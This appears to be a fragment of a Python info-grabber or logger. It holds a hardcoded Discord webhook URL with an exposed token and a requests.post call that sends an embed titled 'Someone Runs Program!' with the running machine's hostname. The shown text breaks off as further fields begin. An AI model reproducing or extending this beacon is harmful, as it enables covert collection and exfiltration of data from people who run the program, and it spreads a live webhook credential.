...
url= "https://discord.com/api/webhooks/1116125490449764414/fixNNq2vAs9yTfqI_zBbPt2wj-inz9LRme678aVa6j357nKPrjkvEk_n7O_dpAAPHtWG" #Paste Discord Webhook url
...
requests.post(url, data=json.dumps(
    { 
        "embeds": [
             { 
                 "title": f"Someone Runs Program! - {host}", "color": 8781568 
                 }, 
                 { 
                     "color": 7506394,
                       "fields": [
